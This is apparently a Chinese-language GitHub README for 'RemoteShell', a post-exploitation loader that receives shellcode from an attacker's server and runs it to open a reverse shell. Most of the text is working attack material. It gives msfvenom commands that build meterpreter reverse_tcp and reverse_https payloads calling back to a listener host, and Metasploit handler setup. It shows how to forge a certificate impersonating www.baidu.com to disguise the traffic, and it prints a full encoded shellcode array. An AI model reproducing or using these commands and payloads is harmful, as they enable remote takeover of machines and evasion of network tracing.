# RemoteShell 远程Shell加载工具

<br>

<div align=center>
 
![image](https://user-images.githubusercontent.com/52789403/192442397-bc23a92a-41f9-4d54-990f-3697ba9fc701.png)
 
</div>

<br>

一款远程ShellCode后门加载运行程序，工具主要用于在后渗透阶段使用，可动态传输并执行服务端发送的ShellCode载荷，实现动态反弹。

 - 生成无加密ShellCode

非加密ShellCode代码主要用于测试可用性,由于数据包非加密,所以无法应对网络溯源.
```C
# 生成代码
[root@localhost ~]# msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp \
-b '\x00\x0b' lhost=192.168.93.128 lport=9999 -f c

[root@localhost ~]# msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_tcp \
-b '\x00\x0b' lhost=192.168.93.128 lport=9999 -f c

# 建立侦听器
[root@localhost ~]# msfconsole
msf6 exploit(handler) > use exploit/multi/handler
msf6 exploit(handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(handler) > set lhost 192.168.93.128
msf6 exploit(handler) > set lport 9999
msf6 exploit(handler) > set EXITFUNC thread
msf6 exploit(handler) > exploit -j -z
```

 - 生成加密ShellCode

通过伪造证书克隆百度PEM文件,并应用于反向ShellCode代码中,此时代码在传输层已经被SSL加密.
```C
# 生成代码
[root@localhost ~]# openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \
> -subj "/C=UK/ST=London/L=London/O=Development/CN=www.baidu.com" \
> -keyout www.baidu.com.key -out www.baidu.com.crt

[root@localhost ~]# cat www.baidu.com.key www.baidu.com.crt > www.baidu.com.pem
[root@localhost ~]# msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_https \
> lhost=192.168.93.128 lport=8443 PayloadUUIDTracking=true PayloadUUIDName=MyShell \
> HandlerSSLCert=/root/www.baidu.com.pem StagerVerifySSLCert=true \
> -f c -o /root/shell.c

# 建立侦听器
[root@localhost ~]# msfconsole
msf6 exploit(handler) > use exploit/multi/handler
msf6 exploit(handler) > set payload windows/meterpreter/reverse_https
msf6 exploit(handler) > set LHOST 192.168.93.128
msf6 exploit(handler) > set LPORT 8443
msf6 exploit(handler) > set HandlerSSLCert /root/www.baidu.com.pem
msf6 exploit(handler) > set StagerVerifySSLCert true
msf6 exploit(handler) > exploit -j -z
```

 - TCP反弹演示

用户通过`msfvenom`生成ShellCode代码，然后将其保存为`shellcode.log`文本文件。
```C
"\xb8\xda\x7e\x23\x13\xdb\xc3\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
"\x59\x31\x43\x14\x83\xeb\xfc\x03\x43\x10\x38\x8b\xdf\xfb\x33"
"\x74\x20\xfc\x2b\xfc\xc5\xcd\x79\x9a\x8e\x7c\x4d\xe8\xc3\x8c"
"\x26\xbc\xf7\xbd\xc7\xca\x8a\x95\x38\x7a\x20\xc0\x77\x44\x19"
"\x30\x16\x38\x60\x65\xf8\x01\xab\x78\xf9\x46\x7d\xf6\x16\x1a"
"\xf5\xaa\xf8\x10\x4b\x77\xf9\xf6\xc7\xc7\x81\x73\x17\x90\x05"
"\x30\x99\xcf\x6e\x80\x81\xbf\xfb\x49\x92\x3e\x28\xec\x1b\x34"
"\xf2\xde\x64\xfc\x81\x15\x10\xfe\x43\x64\xe6\xad\xaa\x48\xeb"
"\xac\xeb\x6f\x14\xdb\x07\x8c\xa9\xdc\xdc\xee\x75\x68\xc2\x49"
"\xfd\xca\x26\x6b\xd2\x8d\xad\x67\x9f\xda\xe9\x6b\x1e\x0e\x82"
"\x90\xab\xb1\x44\x11\xef\x95\x40\x79\xab\xb4\xd1\x27\x1a\xc8"
"\x01\x8f\xc3\x6c\x4a\x22\x15\x10\xb3\xbc\x1a\x4c\x23\x70\xd7"
"\x6f\xb3\x1e\x60\x03\x81\x81\xda\x8b\xa9\x4a\xc5\x4c\xb8\x5d"
"\xf6\x83\x02\x0d\x08\x24\x72\x07\xcf\x70\x22\x3f\xe6\xf8\xa9"
"\xbf\x07\x2d\x47\xca\x9f\x0e\x3f\x97\xdf\xe7\x3d\x28\xc7\xf8"
"\xc8\xce\x57\x57\x9a\x5e\x18\x07\x5a\x0f\xf0\x4d\x55\x70\xe0"
"\x6d\xbc\x19\x8b\x81\x68\x71\x24\x3b\x31\x09\xd5\xc4\xec\x77"
"\xd5\x4f\x04\x87\x98\xa7\x6d\x9b\xcd\xdf\x8d\x63\x0e\x4a\x8d"
"\x09\x0a\xdc\xda\xa5\x10\x39\x2c\x6a\xea\x6c\x2f\x6d\x14\xf1"
"\x19\x05\x23\x67\x25\x71\x4c\x67\xa5\x81\x1a\xed\xa5\xe9\xfa"
"\x55\xf6\x0c\x05\x40\x6b\x9d\x90\x6b\xdd\x71\x32\x04\xe3\xac"
"\x74\x8b\x1c\x9b\x06\xcc\xe2\x59\x21\x75\x8a\xa1\x71\x85\x4a"
"\xc8\x71\xd5\x22\x07\x5d\xda\x82\xe8\x74\xb3\x8a\x63\x19\x71"
"\x2b\x73\x30\xd7\xf5\x74\xb7\xcc\x06\x0e\xb8\xf3\xe7\xef\xd0"
"\x97\xe8\xef\xdc\xa9\xd5\x39\xe5\xdf\x18\xfa\x52\xef\x2f\x5f"
"\xf2\x7a\x4f\xf3\x04\xaf";
```

服务端就是攻击者，在本机执行如下命令，意思是使用TCP模式，侦听本地`8889`端口，一旦客户端上线则自动将`shellcode.log`传输给客户端。
```C
Shell> RemoteShell.exe RunServer --type tcp --listen 8889 --shellcode d://shellcode.log

[*] TCP服务端启动端口: 8889 正在等待上线.
```

此时客户端执行如下命令，意思是主动连接到服务端`127.0.0.1`下面的`8889`端口并执行ShellCode反弹。
```C
Shell> RemoteShell.exe RunClient --type tcp --address 127.0.0.1 --port 8889
```

GitHub项目地址：https://github.com/lyshark/RemoteShell
